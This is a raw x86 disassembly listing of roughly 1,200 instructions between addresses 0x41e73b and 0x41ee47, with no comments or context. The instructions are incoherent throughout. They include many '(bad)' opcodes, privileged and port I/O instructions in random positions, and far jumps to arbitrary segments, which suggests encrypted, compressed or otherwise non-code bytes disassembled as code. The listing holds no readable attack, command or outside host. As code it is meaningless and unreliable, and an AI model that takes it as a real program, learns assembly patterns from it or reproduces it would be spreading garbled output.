  41e73b:	repnz int 0xb
  41e73e:	test   eax,0xf2e59f6a
  41e743:	sbb    DWORD PTR [esp],ebp
  41e746:	mov    ecx,ds
  41e748:	nop
  41e749:	repz push eax
  41e74b:	mov    ds:0x896b1824,al
  41e750:	test   BYTE PTR [esp],dh
  41e753:	nop
  41e754:	(bad)  
  41e755:	(bad)  
  41e756:	sar    DWORD PTR [ebx],1
  41e758:	mul    BYTE PTR [edi+esi*4-0x5c]
  41e75c:	fdivr  st,st(4)
  41e75e:	push   ecx
  41e75f:	xchg   ebx,eax
  41e760:	into   
  41e761:	xchg   ebp,eax
  41e762:	dec    esi
  41e763:	iret   
  41e764:	xor    al,0x4a
  41e766:	and    BYTE PTR ds:0xe765e51f,bh
  41e76c:	cli    
  41e76d:	add    BYTE PTR [eax],dl
  41e76f:	xchg   BYTE PTR ds:[ecx+eiz*4],bl
  41e773:	mov    esp,0x65092997
  41e778:	jns    0x41e7e7
  41e77a:	mov    ?,WORD PTR [ecx-0x8a3aacf]
  41e780:	inc    ebx
  41e781:	pusha  
  41e782:	mov    edx,0xcbee35a7
  41e787:	mov    edi,0xf037b679
  41e78c:	dec    eax
  41e78d:	mov    dh,0xda
  41e78f:	pop    ss
  41e790:	mov    ebp,0xa748714
  41e795:	jns    0x41e7cd
  41e797:	hlt    
  41e798:	mov    cl,0x8
  41e79a:	adc    al,0xb7
  41e79c:	popf   
  41e79d:	mov    eax,0x190506e1
  41e7a2:	repz out dx,al
  41e7a4:	sub    ah,cl
  41e7a6:	retf   
  41e7a7:	mov    ebp,0xe5fb5d78
  41e7ac:	sti    
  41e7ad:	xor    ecx,DWORD PTR [ecx]
  41e7af:	outs   dx,BYTE PTR ds:[esi]
  41e7b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7b1:	pop    edx
  41e7b2:	mov    dl,0xa0
  41e7b4:	stc    
  41e7b5:	int3   
  41e7b6:	ret    
  41e7b7:	push   ecx
  41e7b8:	push   eax
  41e7b9:	push   edx
  41e7ba:	pop    ebp
  41e7bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7bc:	cmc    
  41e7bd:	dec    ebx
  41e7be:	mov    dl,0x41
  41e7c0:	jg     0x41e75f
  41e7c2:	leave  
  41e7c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7c4:	xor    cl,BYTE PTR [eax]
  41e7c6:	mov    ch,0x79
  41e7c8:	xchg   ebp,eax
  41e7c9:	icebp  
  41e7ca:	mov    esp,0xbb563ea5
  41e7cf:	mov    ebp,0x8a804560
  41e7d4:	pushf  
  41e7d5:	push   ss
  41e7d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7d7:	xchg   ebp,eax
  41e7d8:	inc    eax
  41e7d9:	inc    esi
  41e7da:	test   dh,ch
  41e7dc:	iret   
  41e7dd:	in     al,dx
  41e7de:	pop    ds
  41e7df:	sbb    DWORD PTR [eax+0x49],ebp
  41e7e2:	out    0xb0,al
  41e7e4:	xor    DWORD PTR [ebp-0x1dde2c57],ebx
  41e7ea:	mov    ds:0x2f21c3b5,eax
  41e7ef:	xchg   esp,eax
  41e7f0:	xor    esi,esp
  41e7f2:	ret    0x46f6
  41e7f5:	fistp  QWORD PTR [ebx+0x6ab71e41]
  41e7fb:	sahf   
  41e7fc:	or     ebp,DWORD PTR [ebp+0x16]
  41e7ff:	out    dx,al
  41e800:	xlat   BYTE PTR ds:[ebx]
  41e801:	lods   al,BYTE PTR ds:[esi]
  41e802:	inc    ebp
  41e803:	cdq    
  41e804:	les    edx,FWORD PTR fs:[bp+di-0x48df]
  41e80a:	xor    BYTE PTR [edi-0x6e800d72],al
  41e810:	push   edi
  41e811:	lds    esi,FWORD PTR [ebx]
  41e813:	sbb    bh,BYTE PTR [eax]
  41e815:	inc    eax
  41e816:	cmp    eax,0x8e357261
  41e81b:	test   esp,edx
  41e81d:	cmp    al,0xe5
  41e81f:	popf   
  41e820:	pop    esp
  41e821:	adc    eax,DWORD PTR [ebx+0x39]
  41e824:	push   eax
  41e825:	pop    ds
  41e826:	push   ss
  41e827:	and    al,0x68
  41e829:	(bad)  
  41e82a:	push   eax
  41e82b:	add    bl,BYTE PTR [esp+edi*1-0x56bf7e8e]
  41e832:	adc    DWORD PTR [edx*2-0xe5af84a],esp
  41e839:	adc    DWORD PTR [edx+0x22],esp
  41e83c:	sar    BYTE PTR [eax],0x6e
  41e83f:	push   edi
  41e840:	in     al,dx
  41e841:	ret    0x9904
  41e844:	inc    edi
  41e845:	adc    bh,ch
  41e847:	(bad)  
  41e848:	pop    ebp
  41e849:	pop    es
  41e84a:	xor    BYTE PTR [ecx-0x24],0x84
  41e84e:	fwait
  41e84f:	xor    ch,0xe0
  41e852:	cmp    eax,0x94ef425a
  41e857:	jmp    0x448a:0x9eee388b
  41e85e:	out    0x19,eax
  41e860:	jmp    0xab771725
  41e865:	dec    edx
  41e866:	add    dh,BYTE PTR [esi]
  41e868:	jae    0x41e8cf
  41e86a:	lods   eax,DWORD PTR ds:[esi]
  41e86b:	call   0xb91e936c
  41e870:	jb     0x41e7f3
  41e872:	dec    ecx
  41e873:	xchg   esp,eax
  41e874:	in     al,0x75
  41e876:	and    dl,BYTE PTR [edi]
  41e878:	push   esp
  41e879:	xchg   esp,eax
  41e87a:	pop    esp
  41e87b:	into   
  41e87c:	mov    eax,0x96a764c
  41e881:	dec    edx
  41e882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e883:	add    al,ch
  41e885:	pop    esp
  41e886:	stc    
  41e887:	mov    bh,0x11
  41e889:	lea    ebx,[esi-0x3e]
  41e88c:	gs hlt 
  41e88e:	mov    dl,0x41
  41e890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e891:	(bad)  
  41e892:	jl     0x41e864
  41e894:	jbe    0x41e8bb
  41e896:	ins    DWORD PTR es:[edi],dx
  41e897:	and    bl,BYTE PTR [ebx+0x6c]
  41e89a:	xchg   edx,eax
  41e89b:	jp     0x41e8f6
  41e89d:	jo     0x41e8c4
  41e89f:	loope  0x41e85d
  41e8a1:	test   al,0xfc
  41e8a3:	mov    dh,0x7b
  41e8a5:	pop    es
  41e8a6:	data16 lods al,BYTE PTR ds:[esi]
  41e8a8:	out    0x79,eax
  41e8aa:	test   al,0x2
  41e8ac:	mov    ah,0xb5
  41e8ae:	jle    0x41e907
  41e8b0:	push   esi
  41e8b1:	(bad)  
  41e8b2:	cs addr16 sahf 
  41e8b5:	lods   al,BYTE PTR ds:[esi]
  41e8b6:	(bad)  
  41e8b7:	(bad)  
  41e8b8:	loope  0x41e879
  41e8ba:	jno    0x41e8f4
  41e8bc:	xchg   esp,eax
  41e8bd:	xchg   edi,eax
  41e8be:	in     eax,dx
  41e8bf:	dec    eax
  41e8c0:	pop    ss
  41e8c1:	xchg   edx,eax
  41e8c2:	push   edi
  41e8c3:	pusha  
  41e8c4:	mov    esi,0x36588eac
  41e8c9:	stc    
  41e8ca:	jmp    0x41e8ec
  41e8cc:	or     eax,0x2221712a
  41e8d1:	push   esp
  41e8d2:	daa    
  41e8d3:	outs   dx,DWORD PTR ds:[esi]
  41e8d4:	retf   
  41e8d5:	lods   al,BYTE PTR ds:[esi]
  41e8d6:	cmp    esp,esi
  41e8d8:	and    BYTE PTR [ecx],dh
  41e8da:	adc    eax,eax
  41e8dc:	xchg   esp,esp
  41e8de:	cmp    BYTE PTR [eax-0x1686fc9e],bh
  41e8e4:	fisttp DWORD PTR [edi+0x6c8658ac]
  41e8ea:	int3   
  41e8eb:	es pop ds
  41e8ed:	fwait
  41e8ee:	adc    bh,BYTE PTR [ecx]
  41e8f0:	add    al,0xe
  41e8f2:	leave  
  41e8f3:	mov    esi,0xa8910bbe
  41e8f8:	sub    DWORD PTR [esi],ebp
  41e8fa:	and    esi,DWORD PTR [eax-0x5a]
  41e8fd:	mov    eax,0x590968af
  41e902:	sbb    BYTE PTR [edi+edx*1-0x7369cb7e],dl
  41e909:	cwde   
  41e90a:	out    0x96,eax
  41e90c:	sub    BYTE PTR [edx],0xb
  41e90f:	jnp    0x41e8a1
  41e911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e912:	mov    edi,DWORD PTR [ecx]
  41e914:	jbe    0x41e987
  41e916:	xchg   ebx,eax
  41e917:	stos   BYTE PTR es:[edi],al
  41e918:	out    dx,eax
  41e919:	mov    eax,ds:0xb97da2de
  41e91e:	pushf  
  41e91f:	mov    eax,DWORD PTR [esi+eax*2+0x42]
  41e923:	(bad)  
  41e925:	fidivr WORD PTR [esi]
  41e927:	or     bh,BYTE PTR [esi+0x56096c8d]
  41e92d:	(bad)  
  41e92e:	jge    0x41e8fd
  41e930:	int    0x48
  41e932:	sar    DWORD PTR ds:0x79e7b726,1
  41e938:	cmp    BYTE PTR [ecx-0x4077c9ba],bl
  41e93e:	jns    0x41e938
  41e940:	in     al,dx
  41e941:	rol    DWORD PTR [edi+esi*2-0xc],cl
  41e945:	push   edx
  41e946:	call   0xee9b:0x28a0d808
  41e94d:	xchg   ebx,eax
  41e94e:	sub    eax,DWORD PTR [edx-0x39]
  41e951:	cmp    ecx,edi
  41e953:	ds fwait
  41e955:	repz push ss
  41e957:	lods   al,BYTE PTR ds:[esi]
  41e958:	add    eax,0x5c0ca5ed
  41e95d:	inc    ebp
  41e95e:	nop
  41e95f:	mov    eax,0x1f34f1d5
  41e964:	pop    DWORD PTR [eax-0x4c8fa05c]
  41e96a:	pop    edi
  41e96b:	(bad)  
  41e96d:	inc    edx
  41e96e:	gs stos BYTE PTR es:[edi],al
  41e970:	das    
  41e971:	pop    ds
  41e972:	adc    DWORD PTR [edi],ebx
  41e974:	sub    eax,0xb5865964
  41e979:	sahf   
  41e97a:	pop    esi
  41e97b:	(bad)  
  41e97c:	ss push 0x49
  41e97f:	(bad)  [edx]
  41e981:	ret    
  41e982:	adc    edi,DWORD PTR gs:[esp+ebp*8+0x70]
  41e987:	call   0xb590:0x4e0c5788
  41e98e:	dec    edi
  41e98f:	test   eax,0x9e124454
  41e994:	dec    esp
  41e995:	dec    edi
  41e996:	xchg   si,ax
  41e998:	push   ebp
  41e999:	ja     0x41e9fb
  41e99b:	sub    eax,0xf3ee843a
  41e9a0:	inc    ebx
  41e9a1:	lods   al,BYTE PTR ds:[esi]
  41e9a2:	(bad)  
  41e9a3:	mov    ebx,0x643dd986
  41e9a8:	ja     0x41e9f6
  41e9aa:	and    al,0xfc
  41e9ac:	(bad)  [esi]
  41e9ae:	mov    ch,0x10
  41e9b0:	push   es
  41e9b1:	lods   eax,DWORD PTR ds:[esi]
  41e9b2:	jb     0x41e96f
  41e9b4:	mov    al,dl
  41e9b6:	mov    DWORD PTR [ebp-0x49f16ce3],ebx
  41e9bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9bd:	jo     0x41e98e
  41e9bf:	mov    al,0xa6
  41e9c1:	ret    
  41e9c2:	push   ecx
  41e9c3:	pop    ds
  41e9c4:	dec    eax
  41e9c5:	mov    ds:0x845a7059,eax
  41e9ca:	add    edx,eax
  41e9cc:	sbb    ebx,DWORD PTR [ecx+esi*8-0x3b]
  41e9d0:	(bad)  
  41e9d1:	in     al,0xb9
  41e9d3:	xchg   ebp,eax
  41e9d4:	enter  0xcb43,0xae
  41e9d8:	mov    WORD PTR [eax],es
  41e9da:	aas    
  41e9db:	jecxz  0x41e984
  41e9dd:	test   al,0x2e
  41e9df:	into   
  41e9e0:	pushf  
  41e9e1:	jns    0x41e9b2
  41e9e3:	push   esp
  41e9e4:	pusha  
  41e9e5:	inc    ebx
  41e9e6:	adc    esi,DWORD PTR [edx-0x278d7193]
  41e9ec:	in     al,dx
  41e9ed:	ret    0xa708
  41e9f0:	cwde   
  41e9f1:	int3   
  41e9f2:	arpl   WORD PTR [edx-0x6f4eefea],cx
  41e9f8:	jmp    FWORD PTR [esi]
  41e9fa:	jle    0x41ea0b
  41e9fc:	mov    WORD PTR [ecx],cs
  41e9fe:	fcomp  DWORD PTR [esi-0x3dcd2add]
  41ea04:	ins    BYTE PTR es:[edi],dx
  41ea05:	xor    eax,0xf5aba0c1
  41ea0a:	and    BYTE PTR [esi],dh
  41ea0c:	jg     0x41e992
  41ea0e:	mov    ch,0xf6
  41ea10:	jno    0x41e9a7
  41ea12:	mov    ebp,0x7720f774
  41ea17:	push   cs
  41ea18:	mov    bh,0xd2
  41ea1a:	out    0x11,eax
  41ea1c:	xchg   edx,eax
  41ea1d:	jbe    0x41ea5a
  41ea1f:	push   ecx
  41ea20:	mov    dh,0x84
  41ea22:	es xchg ebp,eax
  41ea24:	cmp    al,0xc3
  41ea26:	or     dh,BYTE PTR [esi-0x57]
  41ea29:	in     al,0xf5
  41ea2b:	xchg   edi,eax
  41ea2c:	fs enter 0xbcd3,0x17
  41ea31:	test   DWORD PTR [ecx+0x1c],eax
  41ea34:	push   0xb6c88e6d
  41ea39:	jecxz  0x41ea47
  41ea3b:	ss stc 
  41ea3d:	pop    eax
  41ea3e:	push   ebx
  41ea3f:	adc    bh,BYTE PTR [edi+0x44f9292d]
  41ea45:	mov    edx,0xb51cd99
  41ea4a:	repnz add eax,0x1acf8486
  41ea50:	pop    eax
  41ea51:	sbb    bl,ch
  41ea53:	fld    QWORD PTR [edx-0x1bf5f67c]
  41ea59:	push   ebx
  41ea5a:	jne    0x41e9eb
  41ea5c:	adc    BYTE PTR ds:0xf5935ebf,bh
  41ea62:	inc    ebp
  41ea63:	pop    esp
  41ea64:	and    bl,bl
  41ea66:	jl     0x41ea94
  41ea68:	idiv   BYTE PTR [ebx+ecx*2+0x8c11037]
  41ea6f:	test   dl,cl
  41ea71:	jb     0x41ea91
  41ea73:	jmp    0x94cb8c07
  41ea78:	mov    al,gs:0x1b9856c8
  41ea7e:	int    0x76
  41ea80:	ds nop
  41ea82:	push   ebx
  41ea83:	sar    DWORD PTR [ebx-0x11],0xcd
  41ea87:	ins    BYTE PTR es:[edi],dx
  41ea88:	push   cs
  41ea89:	gs fadd st,st(5)
  41ea8c:	mov    ds:0xfaa46753,al
  41ea91:	test   eax,0x37229efa
  41ea96:	dec    edx
  41ea97:	imul   eax,DWORD PTR [eax+0x6b08870e],0x5b
  41ea9e:	ja     0x41ea9a
  41eaa0:	outs   dx,DWORD PTR ds:[esi]
  41eaa1:	jl     0x41ea27
  41eaa3:	pop    esp
  41eaa4:	lahf   
  41eaa5:	or     BYTE PTR [ecx+0x11],0xc
  41eaa9:	mov    edi,0x546bbaa9
  41eaae:	mov    dl,0x19
  41eab0:	lods   al,BYTE PTR ds:[esi]
  41eab1:	and    eax,0x660ee41d
  41eab6:	xor    eax,0xf718a8df
  41eabc:	jle    0x41eb21
  41eabe:	mul    BYTE PTR [esi]
  41eac0:	outs   dx,BYTE PTR ds:[esi]
  41eac1:	lock jne 0x41eb16
  41eac4:	jae    0x41eafa
  41eac6:	xor    WORD PTR [edi],dx
  41eac9:	stc    
  41eaca:	push   ebx
  41eacb:	and    DWORD PTR [edx],eax
  41eacd:	dec    esp
  41eace:	dec    ebp
  41eacf:	mov    ds:0x51821ade,eax
  41ead4:	aaa    
  41ead5:	add    al,0x19
  41ead7:	(bad)  
  41ead8:	jns    0x41eaa1
  41eada:	add    ebx,DWORD PTR [esi]
  41eadc:	pusha  
  41eadd:	ins    DWORD PTR es:[edi],dx
  41eade:	out    dx,al
  41eadf:	add    al,0x95
  41eae1:	je     0x41eb07
  41eae3:	jge    0x41eb20
  41eae5:	mov    eax,ds:0x356fdfdb
  41eaea:	jle    0x41eafc
  41eaec:	addr16 push ss
  41eaee:	in     eax,0x59
  41eaf0:	sbb    ebp,DWORD PTR [ebx+0x113efd7c]
  41eaf6:	stos   DWORD PTR es:[edi],eax
  41eaf7:	inc    edi
  41eaf8:	sbb    bl,BYTE PTR [esi+0x7e]
  41eafb:	or     BYTE PTR [edx-0x9def92b],ah
  41eb01:	lods   al,BYTE PTR ds:[esi]
  41eb02:	and    DWORD PTR [edi],esi
  41eb04:	mov    ebp,0xc6d91b54
  41eb09:	push   es
  41eb0a:	adc    DWORD PTR [eax+0x48f395c4],ecx
  41eb10:	mov    DWORD PTR [edx+0x2a],0x6fe560e3
  41eb17:	push   cs
  41eb18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb19:	cmp    al,0x5f
  41eb1b:	push   esp
  41eb1c:	enter  0xe6f1,0x61
  41eb20:	cmp    ch,BYTE PTR [ebx-0x26]
  41eb23:	in     eax,0xc
  41eb25:	mov    bl,0xbf
  41eb27:	xchg   ebx,eax
  41eb28:	sub    al,0x64
  41eb2a:	adc    DWORD PTR [eax-0x10],0x66
  41eb2e:	mov    ch,0xc0
  41eb30:	iret   
  41eb31:	xchg   esp,eax
  41eb32:	mov    ds,WORD PTR [ebp-0x67]
  41eb35:	adc    bl,BYTE PTR [ebx-0x2b]
  41eb38:	adc    edx,DWORD PTR [ecx-0x48]
  41eb3b:	scas   al,BYTE PTR es:[edi]
  41eb3c:	dec    ecx
  41eb3d:	scas   eax,DWORD PTR es:[edi]
  41eb3e:	shr    al,0xf2
  41eb41:	shl    BYTE PTR [eax+0x4ac7c699],1
  41eb47:	retf   0xaf27
  41eb4a:	outs   dx,DWORD PTR ds:[esi]
  41eb4b:	je     0x41eb49
  41eb4d:	sbb    al,0xbf
  41eb4f:	inc    esi
  41eb50:	and    al,0xdf
  41eb52:	das    
  41eb53:	call   0x7e18:0x3230460c
  41eb5a:	(bad)  
  41eb5b:	std    
  41eb5c:	jb     0x41eb6d
  41eb5e:	int3   
  41eb5f:	stc    
  41eb60:	mov    esi,0x1e665d49
  41eb65:	and    ah,dl
  41eb67:	ret    0xf20e
  41eb6a:	es pusha 
  41eb6c:	cmp    al,0xcf
  41eb6e:	adc    DWORD PTR [ebx],edi
  41eb70:	mov    bh,0xcc
  41eb72:	mov    ds:0xb45a592a,eax
  41eb77:	dec    eax
  41eb78:	fisttp WORD PTR [ebp+0x33]
  41eb7b:	push   ecx
  41eb7c:	xchg   edi,eax
  41eb7d:	mov    ah,dl
  41eb7f:	test   BYTE PTR [eax],bl
  41eb81:	rol    BYTE PTR [ebx+0x5f328018],0xb2
  41eb88:	and    BYTE PTR [ecx+0x32],bh
  41eb8b:	push   ebp
  41eb8c:	inc    ebp
  41eb8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb8e:	call   0xd861:0xdaaa6c3e
  41eb95:	cli    
  41eb96:	or     dh,BYTE PTR [edi-0x7b]
  41eb99:	inc    edi
  41eb9a:	ins    BYTE PTR es:[edi],dx
  41eb9b:	sub    esp,DWORD PTR [esi-0x54106729]
  41eba1:	push   0xc0b7fab4
  41eba6:	and    ebp,DWORD PTR [edx]
  41eba8:	jmp    0x9925:0x32565149
  41ebaf:	ss pop es
  41ebb1:	or     cl,BYTE PTR [ebx]
  41ebb3:	mov    bh,0x55
  41ebb5:	in     eax,0x80
  41ebb7:	ins    BYTE PTR es:[edi],dx
  41ebb8:	or     eax,0x80c3b4db
  41ebbd:	fsub   st,st(7)
  41ebbf:	test   al,0x6d
  41ebc1:	ret    
  41ebc2:	dec    ebp
  41ebc3:	jno    0x41ec09
  41ebc5:	pusha  
  41ebc6:	aas    
  41ebc7:	out    dx,eax
  41ebc8:	cmp    BYTE PTR [esi+0x2102309b],dh
  41ebce:	or     bh,BYTE PTR [ebp+ecx*1+0x648ccd47]
  41ebd5:	xchg   ebx,eax
  41ebd6:	setge  BYTE PTR [ebx+0x55]
  41ebda:	mov    ebp,0x45715714
  41ebdf:	int    0x82
  41ebe1:	sbb    BYTE PTR [edi+0x1b],0xb
  41ebe5:	addr16 add al,0x1
  41ebe8:	es into 
  41ebea:	xchg   DWORD PTR ds:0x3baad03c,eax
  41ebf0:	test   BYTE PTR [eax],ah
  41ebf2:	push   ebp
  41ebf3:	retf   
  41ebf4:	xchg   DWORD PTR [edi-0x7dbc08c9],ecx
  41ebfa:	dec    esi
  41ebfb:	add    BYTE PTR [edi+0x53],ah
  41ebfe:	dec    ecx
  41ebff:	int3   
  41ec00:	add    DWORD PTR [eax-0x10],ebp
  41ec03:	push   ebx
  41ec04:	int3   
  41ec05:	cmp    ebx,edi
  41ec07:	xor    BYTE PTR [edi+ebx*2-0x5d],ah
  41ec0b:	pop    ss
  41ec0c:	push   cs
  41ec0d:	lock pop es
  41ec0f:	mov    ebp,0xb152c13d
  41ec14:	push   edx
  41ec15:	inc    ebp
  41ec16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec17:	push   edi
  41ec18:	es hlt 
  41ec1a:	loopne 0x41ec7e
  41ec1c:	xor    DWORD PTR [ecx],edx
  41ec1e:	sbb    dl,BYTE PTR [edx+0x78]
  41ec21:	ret    0x1241
  41ec24:	fidiv  WORD PTR [ebp+0x3f]
  41ec27:	adc    eax,eax
  41ec29:	jge    0x41ebfd
  41ec2b:	push   0x55
  41ec2d:	adc    eax,0xbe9bb277
  41ec32:	nop
  41ec33:	test   BYTE PTR ds:0xd5bcb403,dl
  41ec39:	sbb    al,0x32
  41ec3b:	sub    eax,0xd045ce03
  41ec40:	mov    eax,0x6a6a0a6a
  41ec45:	push   ecx
  41ec46:	pop    es
  41ec47:	jg     0x41ec7f
  41ec49:	cmp    al,0xc1
  41ec4b:	retf   0xdde4
  41ec4e:	call   0x6d6377af
  41ec53:	jecxz  0x41ec24
  41ec55:	jbe    0x41ec20
  41ec57:	fbstp  TBYTE PTR [edi+0xb]
  41ec5a:	xlat   BYTE PTR ds:[ebx]
  41ec5b:	jge    0x41ebf8
  41ec5d:	aaa    
  41ec5e:	test   al,0xaf
  41ec60:	dec    ebp
  41ec61:	out    0xc0,al
  41ec63:	lods   eax,DWORD PTR ds:[esi]
  41ec64:	hlt    
  41ec65:	icebp  
  41ec66:	fild   QWORD PTR [ebp+0x6b]
  41ec69:	cwde   
  41ec6a:	jl     0x41ecd6
  41ec6c:	iret   
  41ec6d:	jle    0x41ec20
  41ec6f:	neg    DWORD PTR [ecx-0x2e8a0902]
  41ec75:	ret    0xd67f
  41ec78:	cwde   
  41ec79:	xor    al,0xf4
  41ec7b:	sub    eax,0xfaab4f6b
  41ec80:	fdivr  QWORD PTR [eax+0x5d]
  41ec83:	call   DWORD PTR [edx]
  41ec85:	push   cs
  41ec86:	ss or  edi,edx
  41ec89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec8a:	sahf   
  41ec8b:	outs   dx,DWORD PTR ds:[esi]
  41ec8c:	lods   al,BYTE PTR ds:[esi]
  41ec8d:	xchg   esi,eax
  41ec8e:	dec    ecx
  41ec8f:	inc    edi
  41ec90:	xor    eax,0xaf27f34
  41ec95:	jbe    0x41ecda
  41ec97:	es mov edx,0x140c3375
  41ec9d:	pop    esp
  41ec9e:	addr16 mov ecx,0x91b0d52
  41eca4:	lahf   
  41eca5:	jmp    0xea658fd5
  41ecaa:	add    eax,0x51ade0f2
  41ecaf:	mov    eax,ds:0x5b578b41
  41ecb4:	std    
  41ecb5:	push   cs
  41ecb6:	mov    ecx,0xf5eb0e5f
  41ecbb:	pop    esi
  41ecbc:	into   
  41ecbd:	push   cs
  41ecbe:	js     0x41ecc1
  41ecc0:	lds    esi,FWORD PTR [edx]
  41ecc2:	lea    esp,[eax]
  41ecc4:	pop    ss
  41ecc5:	jo     0x41ed0c
  41ecc7:	mov    ebx,tr0
  41ecca:	sub    ecx,DWORD PTR [esi-0x62]
  41eccd:	out    dx,eax
  41ecce:	add    dh,dh
  41ecd0:	adc    eax,0x874fd805
  41ecd5:	xchg   edx,eax
  41ecd6:	jo     0x41ed3c
  41ecd8:	jae    0x41ecf5
  41ecda:	es pop eax
  41ecdc:	add    DWORD PTR [ebp+edi*1-0x79da0fb],esp
  41ece3:	das    
  41ece4:	loop   0x41ed51
  41ece6:	push   eax
  41ece7:	in     al,dx
  41ece8:	or     eax,0x4d22628
  41eced:	les    ebp,FWORD PTR [eax-0x4598a6b7]
  41ecf3:	jne    0x41ecd4
  41ecf5:	scas   al,BYTE PTR es:[edi]
  41ecf6:	dec    edi
  41ecf7:	ins    BYTE PTR es:[edi],dx
  41ecf8:	xchg   esi,eax
  41ecf9:	inc    edi
  41ecfa:	sub    eax,DWORD PTR [edx+ebp*8-0x1ac058ef]
  41ed01:	cmp    eax,0x8e746195
  41ed06:	fldenv [eax-0x69]
  41ed09:	sub    BYTE PTR [edi+0x74],dh
  41ed0c:	push   ebp
  41ed0d:	xor    eax,0x29485636
  41ed12:	xor    eax,0x223f1726
  41ed17:	and    DWORD PTR [edx-0x56b95e08],0xffffffd1
  41ed1e:	pop    eax
  41ed20:	retf   
  41ed21:	outs   dx,BYTE PTR ds:[esi]
  41ed22:	ja     0x41ecfd
  41ed24:	jge    0x41ed90
  41ed26:	inc    edi
  41ed27:	fwait
  41ed28:	mov    edi,esp
  41ed2a:	(bad)  [ebx]
  41ed2c:	aas    
  41ed2d:	ret    
  41ed2e:	jo     0x41ece8
  41ed30:	xchg   edx,eax
  41ed31:	xor    edi,DWORD PTR [eax]
  41ed33:	scas   eax,DWORD PTR es:[edi]
  41ed34:	lods   al,BYTE PTR ds:[esi]
  41ed35:	sub    al,0x68
  41ed37:	std    
  41ed38:	jb     0x41ed40
  41ed3a:	bound  ebx,QWORD PTR ss:[ecx-0x50d317db]
  41ed41:	push   ebp
  41ed42:	in     eax,0x2d
  41ed44:	mov    ecx,0x71441eab
  41ed49:	fldln2 
  41ed4b:	jmp    0x41ed06
  41ed4d:	jg     0x41ed2d
  41ed4f:	xchg   ebx,eax
  41ed50:	(bad)  
  41ed51:	adc    DWORD PTR [esp+esi*1-0x8],ecx
  41ed55:	sbb    edi,DWORD PTR ds:0xe89955a7
  41ed5b:	inc    edi
  41ed5c:	ret    0x14c7
  41ed5f:	into   
  41ed60:	or     edx,eax
  41ed62:	test   DWORD PTR [ebp+0x54],edi
  41ed65:	shr    BYTE PTR [ebx-0xb],cl
  41ed68:	cmp    BYTE PTR [ebx+edx*4+0x29f8ca6b],0x7c
  41ed70:	iret   
  41ed71:	inc    ecx
  41ed72:	or     al,0x94
  41ed74:	xor    DWORD PTR [esi-0x21],ebp
  41ed77:	js     0x41ed24
  41ed79:	(bad)  
  41ed7a:	neg    eax
  41ed7c:	or     DWORD PTR ds:0x5917a3b3,ebx
  41ed82:	imul   esi,ebx,0x91d7dd41
  41ed88:	out    0xaf,al
  41ed8a:	movd   mm6,DWORD PTR [edx+0x3a118f2e]
  41ed91:	pop    ds
  41ed92:	imul   DWORD PTR [eax+0x3f789e63]
  41ed98:	popa   
  41ed99:	adc    al,0x64
  41ed9b:	jg     0x41ed82
  41ed9d:	jbe    0x41ed24
  41ed9f:	xor    bh,bh
  41eda1:	mov    BYTE PTR [edx+0x7a],al
  41eda4:	mov    edx,0x63879b00
  41eda9:	push   edi
  41edaa:	push   cs
  41edab:	push   esi
  41edac:	jecxz  0x41ed97
  41edae:	adc    bl,BYTE PTR [edx-0xe]
  41edb1:	xchg   edi,eax
  41edb2:	push   ds
  41edb3:	xor    DWORD PTR [edi+eax*4-0x74978dc3],0x2b1226a5
  41edbe:	add    edx,edx
  41edc0:	push   ebp
  41edc1:	(bad)  
  41edc2:	loopne 0x41edcf
  41edc4:	add    al,0x31
  41edc6:	outs   dx,BYTE PTR ds:[esi]
  41edc7:	loop   0x41edd8
  41edc9:	sub    BYTE PTR [esi+edi*1-0x62],0xd6
  41edce:	out    0xf4,al
  41edd0:	repnz scas al,BYTE PTR es:[edi]
  41edd2:	out    dx,al
  41edd3:	rdpmc  
  41edd5:	push   edi
  41edd6:	hlt    
  41edd7:	push   ebp
  41edd8:	inc    ecx
  41edd9:	dec    eax
  41edda:	dec    ebp
  41eddb:	icebp  
  41eddc:	mov    DWORD PTR ss:[ebx],edx
  41eddf:	test   edx,ebx
  41ede1:	jle    0x41edd6
  41ede3:	(bad)  
  41ede4:	rol    DWORD PTR [esi-0x57],0x9
  41ede8:	outs   dx,BYTE PTR ds:[esi]
  41ede9:	mov    bh,0xe1
  41edeb:	popf   
  41edec:	adc    eax,0x4b879c1
  41edf1:	and    eax,0x8c47806
  41edf6:	sub    cl,ah
  41edf8:	push   ebx
  41edf9:	push   edi
  41edfa:	aas    
  41edfb:	jae    0x41ee2b
  41edfd:	arpl   WORD PTR [ebx+0x2],dx
  41ee00:	and    ebx,DWORD PTR [edx-0x35]
  41ee03:	mov    edi,0x1bf1abf
  41ee08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee09:	(bad)  
  41ee0b:	jg     0x41ee7d
  41ee0d:	pop    es
  41ee0e:	outs   dx,DWORD PTR ds:[esi]
  41ee0f:	iret   
  41ee10:	jno    0x41edf1
  41ee12:	fisttp DWORD PTR [edi-0x15]
  41ee15:	adc    dh,ah
  41ee17:	sbb    DWORD PTR [ebp-0x4],ebx
  41ee1a:	pushf  
  41ee1b:	cmp    ecx,edx
  41ee1d:	stc    
  41ee1e:	inc    eax
  41ee1f:	fwait
  41ee20:	sub    eax,0xf7429a96
  41ee25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee26:	outs   dx,BYTE PTR ds:[esi]
  41ee28:	call   0x270b:0x1ebdef65
  41ee2f:	push   ss
  41ee30:	inc    edx
  41ee31:	in     al,0x58
  41ee33:	fdivr  QWORD PTR ds:0xc0fa60d9
  41ee39:	jns    0x41ee4b
  41ee3b:	pop    ebx
  41ee3c:	pop    ecx
  41ee3d:	sbb    al,BYTE PTR [ebp+0x4b6522ec]
  41ee43:	sub    BYTE PTR [eax+0x34],al
  41ee46:	pop    ds
  41ee47:	fld    DWORD PTR [edi+0x1b4e551d]
